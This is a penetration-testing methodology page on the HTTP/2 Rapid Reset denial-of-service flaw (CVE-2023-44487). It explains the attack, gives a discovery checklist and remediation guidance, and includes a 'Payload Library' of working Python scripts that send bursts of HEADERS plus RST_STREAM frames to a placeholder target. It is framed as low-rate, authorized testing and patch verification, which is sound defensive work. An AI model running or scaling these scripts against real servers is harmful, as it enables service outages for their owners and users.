---
title: "HTTP/2 Rapid Reset (CVE-2023-44487)"
date: 2026-02-24
draft: false
---

# HTTP/2 Rapid Reset (CVE-2023-44487)

> **Severity**: High (DoS) | **CWE**: CWE-400
> **OWASP**: A05:2021 – Security Misconfiguration

---

## What Is HTTP/2 Rapid Reset?

HTTP/2 Rapid Reset is a DoS amplification technique that exploits the HTTP/2 stream multiplexing mechanism. In HTTP/2, a client can open multiple concurrent streams on a single TCP connection and cancel them immediately with a `RST_STREAM` frame — before the server has finished processing them.

The attack pattern:
1. Client sends `HEADERS` frame (initiates a request on stream N)
2. Client immediately sends `RST_STREAM` frame (cancels stream N)
3. Repeat at high rate — the server must still process each HEADERS frame before seeing the reset

The server incurs full request parsing and dispatch cost per stream. The client incurs almost none — it resets before receiving any response. This asymmetry is the amplification vector.

```
Normal HTTP/2 stream lifecycle:
  Client: HEADERS → DATA → ...
  Server: HEADERS → DATA → ...

Rapid Reset:
  Client: HEADERS → RST_STREAM (repeat at max rate)
  Server: (parses, routes, allocates handlers) → (reset received) → (teardown)
          ↑ full CPU cost per stream despite immediate client cancellation
```

HTTP/2 multiplexing allows up to `SETTINGS_MAX_CONCURRENT_STREAMS` streams (commonly 100-250). Rapid Reset bypasses this limit because RST'd streams free up the slot counter — the attacker keeps the slot count below the limit while sustaining an arbitrarily high request rate.

**Affected surface**: Any HTTP/2 endpoint — nginx, Apache httpd, H2O, Envoy, Go's `net/http`, HAProxy, Node.js, CDN edge nodes. This was weaponized in the largest DDoS ever recorded at the time of disclosure (398 Mpps, Google; 201 Mrps, Cloudflare).

**Pentest relevance**: In authorized engagements, testing for the vulnerability requires confirming HTTP/2 support and measuring server degradation under rapid stream reset. The goal is not to run the attack at scale but to confirm susceptibility and provide evidence for patching priority.

---

## Discovery Checklist

**Phase 1 — Confirm HTTP/2 Support**
- [ ] Use `curl --http2 -v` — look for `< HTTP/2` in response
- [ ] Check ALPN negotiation: `openssl s_client -alpn h2 -connect target.com:443`
- [ ] Look for `Upgrade: h2c` in HTTP/1.1 responses → h2c cleartext support
- [ ] Use `nghttp -nv` to negotiate HTTP/2 and view SETTINGS frame
- [ ] Enumerate HTTP/2 SETTINGS: `SETTINGS_MAX_CONCURRENT_STREAMS`, `SETTINGS_INITIAL_WINDOW_SIZE`

**Phase 2 — Confirm RST_STREAM Handling**
- [ ] Send HEADERS + immediate RST_STREAM — verify server returns no response (correctly cancelled)
- [ ] Measure server-side CPU before and during RST_STREAM flood (requires auth'd infrastructure access or coordination with target)
- [ ] Check server version against known patched versions (see remediation)
- [ ] Probe `SETTINGS_MAX_CONCURRENT_STREAMS` value — lower values reduce amplification but don't eliminate it
- [ ] Test h2c (cleartext) separately — sometimes h2c endpoints are unpatched when TLS is handled by a frontend proxy

**Phase 3 — Measure Amplification Factor**
- [ ] Compare request rate achievable with rapid reset vs. normal HTTP/2 requests
- [ ] Measure latency degradation on legitimate requests during low-rate rapid reset
- [ ] Check error log patterns: HTTP 500 storms, connection resets, timeout spikes
- [ ] Confirm if server enforces GOAWAY after RST_STREAM flood (patched behavior)
- [ ] Verify whether CDN/WAF layer absorbs the attack or passes it to origin

---

## Payload Library

### Payload 1 — HTTP/2 Connection and SETTINGS Enumeration

```bash
# Confirm HTTP/2 support via ALPN:
openssl s_client -alpn h2 -connect target.com:443 -quiet 2>&1 | head -20
# Look for: ALPN protocol: h2

# curl HTTP/2 negotiation:
curl -v --http2 https://target.com/ 2>&1 | grep -E "^[<>*]"
# Look for: < HTTP/2 200

# nghttp — full HTTP/2 frame dump including SETTINGS:
nghttp -nv https://target.com/ 2>&1 | grep -E "SETTINGS|HEADERS|RST"

# h2spec — HTTP/2 conformance tester (useful for identifying non-standard behavior):
h2spec -h target.com -p 443 -t -S

# Check h2c (cleartext HTTP/2 upgrade):
curl -v --http2 http://target.com/ 2>&1 | grep -E "Upgrade|HTTP/2|h2c"
# Explicit h2c prior knowledge:
curl -v --http2-prior-knowledge http://target.com/ 2>&1 | head -30

# Read server SETTINGS_MAX_CONCURRENT_STREAMS:
python3 -c "
import h2.connection, h2.config, h2.events
import ssl, socket

ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

sock = socket.create_connection(('target.com', 443))
tls = ctx.wrap_socket(sock, server_hostname='target.com')

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
tls.sendall(conn.data_to_send(65535))

data = tls.recv(65535)
events = conn.receive_data(data)
for event in events:
    if hasattr(event, 'changed_settings'):
        for setting_id, setting in event.changed_settings.items():
            print(f'SETTING {setting_id}: {setting.new_value}')
tls.close()
"
```

### Payload 2 — Single RST_STREAM Proof of Concept

```python
#!/usr/bin/env python3
"""
HTTP/2 RST_STREAM behavior probe
Confirms the server handles RST_STREAM and measures single-stream overhead
Requires: pip3 install h2
"""
import h2.connection
import h2.config
import h2.events
import ssl
import socket
import time

TARGET_HOST = "target.com"
TARGET_PORT = 443
PATH = "/"

def build_tls_conn(host, port):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((host, port), timeout=10)
    tls = ctx.wrap_socket(sock, server_hostname=host)
    assert tls.selected_alpn_protocol() == "h2", "Server did not negotiate h2"
    return tls

def probe_rst_stream():
    tls = build_tls_conn(TARGET_HOST, TARGET_PORT)
    config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    tls.sendall(conn.data_to_send(65535))

    # Read server preface / SETTINGS
    data = tls.recv(65535)
    conn.receive_data(data)
    tls.sendall(conn.data_to_send(65535))

    headers = [
        (":method", "GET"),
        (":path", PATH),
        (":scheme", "https"),
        (":authority", TARGET_HOST),
        ("user-agent", "h2-probe/1.0"),
    ]

    stream_id = 1
    t0 = time.perf_counter()

    # Send HEADERS frame
    conn.send_headers(stream_id, headers)
    tls.sendall(conn.data_to_send(65535))

    # Immediately send RST_STREAM
    conn.reset_stream(stream_id, error_code=0)
    tls.sendall(conn.data_to_send(65535))

    t1 = time.perf_counter()
    print(f"[*] HEADERS + RST_STREAM sent in {(t1-t0)*1000:.2f}ms on stream {stream_id}")

    # Read server response (should be empty or GOAWAY/RST_STREAM echo)
    tls.settimeout(2)
    try:
        resp = tls.recv(65535)
        events = conn.receive_data(resp)
        for event in events:
            print(f"[<] Server event: {type(event).__name__}")
            if hasattr(event, "error_code"):
                print(f"    error_code: {event.error_code}")
    except socket.timeout:
        print("[*] No server response within 2s (expected for RST'd stream)")

    tls.close()

probe_rst_stream()
```

### Payload 3 — Rapid Reset Rate Measurement (Low-Rate Audit Tool)

```python
#!/usr/bin/env python3
"""
HTTP/2 Rapid Reset audit — measures achievable RST_STREAM rate
Low-rate version for authorized penetration testing
NOT for DDoS — use only against systems you own or have explicit written authorization to test

Requires: pip3 install h2
"""
import h2.connection
import h2.config
import h2.events
import ssl
import socket
import time
import threading

TARGET_HOST = "target.com"
TARGET_PORT = 443
PATH = "/"
STREAMS_PER_BATCH = 50     # streams to open+reset per burst
BURST_COUNT = 5            # number of bursts
BURST_DELAY = 0.5          # seconds between bursts (keep low-rate)

stats = {"sent": 0, "errors": 0, "duration": 0}

def build_conn():
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)
    tls = ctx.wrap_socket(sock, server_hostname=TARGET_HOST)
    assert tls.selected_alpn_protocol() == "h2"

    config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    tls.sendall(conn.data_to_send(65535))

    # Exchange preface
    data = tls.recv(65535)
    events = conn.receive_data(data)
    tls.sendall(conn.data_to_send(65535))

    return tls, conn

def rapid_reset_burst(burst_num):
    tls, conn = build_conn()
    headers = [
        (":method", "GET"),
        (":path", PATH),
        (":scheme", "https"),
        (":authority", TARGET_HOST),
        ("user-agent", "security-audit/1.0"),
    ]

    t0 = time.perf_counter()
    count = 0

    for i in range(STREAMS_PER_BATCH):
        stream_id = 1 + i * 2  # streams must be odd for client-initiated
        try:
            conn.send_headers(stream_id, headers)
            conn.reset_stream(stream_id, error_code=0)
            pending = conn.data_to_send(65535)
            if pending:
                tls.sendall(pending)
            count += 1
        except Exception as e:
            stats["errors"] += 1
            break

    t1 = time.perf_counter()
    elapsed = t1 - t0
    rate = count / elapsed if elapsed > 0 else 0

    print(f"  Burst {burst_num}: {count} streams in {elapsed:.3f}s = {rate:.0f} streams/sec")
    stats["sent"] += count

    tls.close()

print(f"[*] HTTP/2 Rapid Reset audit against {TARGET_HOST}:{TARGET_PORT}")
print(f"[*] {BURST_COUNT} bursts of {STREAMS_PER_BATCH} streams each\n")

t_start = time.perf_counter()
for b in range(BURST_COUNT):
    rapid_reset_burst(b + 1)
    if b < BURST_COUNT - 1:
        time.sleep(BURST_DELAY)

t_end = time.perf_counter()
total_time = t_end - t_start

print(f"\n[*] Total streams sent: {stats['sent']}")
print(f"[*] Errors: {stats['errors']}")
print(f"[*] Total duration: {total_time:.2f}s")
print(f"[*] Average rate: {stats['sent']/total_time:.0f} streams/sec")
print(f"[!] If rate >> SETTINGS_MAX_CONCURRENT_STREAMS: server is susceptible")
```

### Payload 4 — h2c Cleartext Rapid Reset

```python
#!/usr/bin/env python3
"""
HTTP/2 Rapid Reset probe for h2c (cleartext) endpoints
Some load balancers terminate TLS and forward h2c to backends
h2c backends may be unpatched even when TLS frontend is patched

Requires: pip3 install h2
"""
import h2.connection
import h2.config
import socket
import time

TARGET_HOST = "target.com"
TARGET_PORT = 80  # or 8080, 8443 for h2c backends

def h2c_upgrade():
    """HTTP/1.1 → h2c upgrade handshake"""
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)

    # HTTP Upgrade request
    upgrade_req = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"  # base64url encoded SETTINGS frame
        f"\r\n"
    ).encode()

    sock.sendall(upgrade_req)
    resp = sock.recv(4096).decode(errors="replace")

    if "101" in resp:
        print("[+] h2c Upgrade accepted (101 Switching Protocols)")
        return sock
    elif "HTTP/2" in resp or "h2c" in resp:
        print("[+] Server supports h2c (prior knowledge)")
        return sock
    else:
        print(f"[-] h2c Upgrade rejected: {resp[:200]}")
        return None

def h2c_rst_probe():
    sock = h2c_upgrade()
    if not sock:
        # Try prior knowledge
        sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)

    config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send(65535))

    data = sock.recv(65535)
    conn.receive_data(data)
    sock.sendall(conn.data_to_send(65535))

    headers = [
        (":method", "GET"),
        (":path", "/"),
        (":scheme", "http"),
        (":authority", TARGET_HOST),
    ]

    t0 = time.perf_counter()
    for i in range(20):
        sid = 1 + i * 2
        try:
            conn.send_headers(sid, headers)
            conn.reset_stream(sid, error_code=0)
            sock.sendall(conn.data_to_send(65535))
        except Exception as e:
            print(f"  Stream {sid} error: {e}")
            break
    t1 = time.perf_counter()

    print(f"[*] h2c RST_STREAM probe: 20 streams in {(t1-t0)*1000:.1f}ms")
    sock.close()

h2c_rst_probe()
```

### Payload 5 — GOAWAY Enforcement Check (Patch Verification)

```python
#!/usr/bin/env python3
"""
Verify whether server sends GOAWAY after excessive RST_STREAM frames
Patched servers limit concurrent RST_STREAM resets and send GOAWAY

Requires: pip3 install h2
"""
import h2.connection
import h2.config
import h2.events
import ssl
import socket
import time

TARGET_HOST = "target.com"
TARGET_PORT = 443

def check_goaway_enforcement():
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=15)
    tls = ctx.wrap_socket(sock, server_hostname=TARGET_HOST)

    config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    tls.sendall(conn.data_to_send(65535))

    data = tls.recv(65535)
    conn.receive_data(data)
    tls.sendall(conn.data_to_send(65535))

    headers = [
        (":method", "GET"),
        (":path", "/"),
        (":scheme", "https"),
        (":authority", TARGET_HOST),
    ]

    print("[*] Sending 200 rapid HEADERS+RST_STREAM frames...")
    goaway_received = False
    rst_count = 0

    for i in range(100):
        sid = 1 + i * 2
        try:
            conn.send_headers(sid, headers)
            conn.reset_stream(sid, error_code=0)
            tls.sendall(conn.data_to_send(65535))
            rst_count += 1
        except Exception as e:
            print(f"  Send error at stream {sid}: {e}")
            break

        # Check for incoming GOAWAY after each batch of 10
        if i % 10 == 9:
            tls.settimeout(0.1)
            try:
                resp = tls.recv(65535)
                if resp:
                    events = conn.receive_data(resp)
                    for event in events:
                        if isinstance(event, h2.events.ConnectionTerminated):
                            print(f"[+] GOAWAY received after {rst_count} RST_STREAMs")
                            print(f"    Error code: {event.error_code}")
                            print(f"    Additional data: {event.additional_data}")
                            goaway_received = True
                            break
            except socket.timeout:
                pass

        if goaway_received:
            break

    tls.settimeout(3)
    if not goaway_received:
        print(f"[!] NO GOAWAY after {rst_count} RST_STREAMs — server may be UNPATCHED")
        print(f"    Patched servers typically send GOAWAY within 100-200 RST_STREAMs")
        try:
            resp = tls.recv(65535)
            events = conn.receive_data(resp)
            for event in events:
                print(f"    Late event: {type(event).__name__}")
        except:
            pass
    else:
        print(f"[+] Server enforces GOAWAY — appears PATCHED against rapid reset")

    tls.close()

check_goaway_enforcement()
```

### Payload 6 — Concurrent Streams Window Abuse

```python
#!/usr/bin/env python3
"""
Test SETTINGS_MAX_CONCURRENT_STREAMS enforcement
Patched servers also reduce this setting to limit amplification
This probe tests whether the server enforces the limit properly
"""
import h2.connection
import h2.config
import h2.events
import ssl
import socket
import time

TARGET_HOST = "target.com"
TARGET_PORT = 443

def test_concurrent_stream_limit():
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=15)
    tls = ctx.wrap_socket(sock, server_hostname=TARGET_HOST)

    config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    tls.sendall(conn.data_to_send(65535))

    # Read server SETTINGS
    server_max_streams = 100  # default assumption
    data = tls.recv(65535)
    events = conn.receive_data(data)
    for event in events:
        if hasattr(event, "changed_settings"):
            for sid, setting in event.changed_settings.items():
                if sid == 3:  # SETTINGS_MAX_CONCURRENT_STREAMS
                    server_max_streams = setting.new_value
                    print(f"[*] Server SETTINGS_MAX_CONCURRENT_STREAMS: {server_max_streams}")
    tls.sendall(conn.data_to_send(65535))

    headers = [
        (":method", "GET"),
        (":path", "/"),
        (":scheme", "https"),
        (":authority", TARGET_HOST),
    ]

    # Open streams up to limit + 10 (to test enforcement)
    open_streams = []
    refused_at = None
    print(f"[*] Attempting to open {server_max_streams + 10} concurrent streams...")

    for i in range(server_max_streams + 10):
        sid = 1 + i * 2
        try:
            conn.send_headers(sid, headers, end_stream=False)
            pending = conn.data_to_send(65535)
            if pending:
                tls.sendall(pending)
            open_streams.append(sid)
        except h2.exceptions.StreamClosedError:
            print(f"  Stream {sid} rejected by h2 library (stream limit)")
            refused_at = i
            break
        except Exception as e:
            print(f"  Error at stream {sid}: {type(e).__name__}: {e}")
            refused_at = i
            break

    print(f"[*] Opened {len(open_streams)} streams")

    # Check server response — should see RST_STREAM or GOAWAY for excess
    tls.settimeout(2)
    try:
        resp = tls.recv(65535)
        events = conn.receive_data(resp)
        for event in events:
            if isinstance(event, h2.events.StreamReset):
                print(f"  Server RST_STREAM on stream {event.stream_id}: error={event.error_code}")
            elif isinstance(event, h2.events.ConnectionTerminated):
                print(f"  Server GOAWAY: error={event.error_code}")
    except socket.timeout:
        print("  No immediate server response to stream overflow")

    tls.close()

test_concurrent_stream_limit()
```

---

## Tools

```bash
# Install h2 library (core dependency for all scripts above):
pip3 install h2

# nghttp2 — reference HTTP/2 client with frame-level visibility:
sudo apt install nghttp2-client
nghttp -nv https://target.com/ 2>&1 | grep -E "SETTINGS|MAX_CONCURRENT|RST"

# h2spec — HTTP/2 protocol conformance tester:
# Tests whether server correctly handles malformed/edge-case HTTP/2
wget https://github.com/summerwind/h2spec/releases/latest/download/h2spec_linux_amd64.tar.gz
tar xzf h2spec_linux_amd64.tar.gz
./h2spec -h target.com -p 443 -t -S --timeout 5

# curl — confirm HTTP/2 support and ALPN:
curl -v --http2 https://target.com/ 2>&1 | grep -E "< HTTP/2|ALPN|TLS"

# openssl — confirm h2 ALPN negotiation:
echo | openssl s_client -alpn h2 -connect target.com:443 2>&1 | grep -E "ALPN|Protocol"

# nmap — detect HTTP/2 support:
nmap --script http2-hpack,ssl-enum-ciphers -p 443 target.com

# Check server version against patched releases:
# nginx: >= 1.25.3 (patched Oct 2023)
# Apache httpd: >= 2.4.58 (patched Oct 2023)
# HAProxy: >= 2.8.3 (patched Oct 2023)
# Node.js: >= 18.18.2, 20.8.1 (patched Oct 2023)
# Go: >= 1.21.3 (patched Oct 2023)
# Envoy: >= 1.27.1 (patched Oct 2023)

curl -sI https://target.com/ | grep -i server
# Then compare to patched version database above

# netcat + HTTP/2 preface check (manual):
# HTTP/2 connection preface is PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n
printf 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n' | openssl s_client -quiet -alpn h2 -connect target.com:443 2>/dev/null | xxd | head -5
# If server responds with SETTINGS frame (starts with 0x000000040000): HTTP/2 active

# Measure server response time degradation during RST_STREAM flood (authorized testing):
# Run the rapid reset script in background, simultaneously measure latency:
python3 61_rst_probe.py &
PROBE_PID=$!
for i in {1..10}; do
    time curl -s --http2 https://target.com/ > /dev/null
    sleep 1
done
kill $PROBE_PID
# Significant latency increase = server resource exhaustion = susceptible

# Wireshark filter for RST_STREAM analysis:
# tcp.port == 443 && http2.type == 3
# Frame type 3 = RST_STREAM — visualizes rapid reset pattern in pcap
```

---

## Remediation Reference

- **Upgrade server software**: Patches were released for all major HTTP/2 implementations in October 2023 — upgrade to nginx >= 1.25.3, Apache httpd >= 2.4.58, Go >= 1.21.3, HAProxy >= 2.8.3, Node.js >= 18.18.2/20.8.1, Envoy >= 1.27.1
- **Reduce `SETTINGS_MAX_CONCURRENT_STREAMS`**: Lower the limit from the default (100-250) to a smaller value (e.g., 32) — reduces amplification factor but does not eliminate the attack; patched servers combine this with rate limiting
- **RST_STREAM rate limiting**: Patched implementations count RST_STREAMs per connection and send `GOAWAY` (with `ENHANCE_YOUR_CALM` error code 0xb) when the rate exceeds a threshold, then close the TCP connection
- **CDN / WAF fronting**: Place a patched CDN layer in front of origin servers — Cloudflare, AWS CloudFront, and Google Cloud all patched at the edge before origin-level patches were available; even if origin is unpatched, a patched edge absorbs the attack
- **Connection-level rate limiting**: Limit the number of HTTP/2 connections per source IP at the load balancer — reduces parallelism available to an attacker
- **TCP connection limits**: Limit concurrent TCP connections from a single IP; at-scale HTTP/2 Rapid Reset requires many TCP connections to exceed millions of requests/sec
- **Monitor for RST_STREAM anomalies**: Alert on connections where `RST_STREAM` frames exceed 50% of `HEADERS` frames within a sliding window — indicates rapid reset pattern
- **h2c backend protection**: Ensure backend servers (not just TLS-terminating frontends) are patched — h2c-speaking backends are frequently overlooked when TLS termination hides HTTP/2 at the edge

*Part of the Web Application Penetration Testing Methodology series.*
